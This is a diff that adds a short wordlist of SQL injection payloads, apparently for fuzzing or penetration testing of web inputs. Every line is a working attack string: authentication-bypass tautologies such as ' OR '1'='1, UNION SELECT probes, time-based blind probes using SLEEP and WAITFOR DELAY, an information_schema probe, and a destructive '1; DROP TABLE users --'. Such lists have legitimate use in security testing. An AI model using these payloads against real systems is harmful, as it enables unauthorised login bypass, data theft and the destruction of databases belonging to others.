@@ -1,0 +1,18 @@
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR 1=1 --
+" OR 1=1 --
+1' OR '1'='1
+1" OR "1"="1
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+1; DROP TABLE users --
+' AND 1=1 --
+' AND 1=2 --
+' OR 'x'='x
+'; WAITFOR DELAY '0:0:5' --
+' OR SLEEP(5) --
+1' AND SLEEP(5) --
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
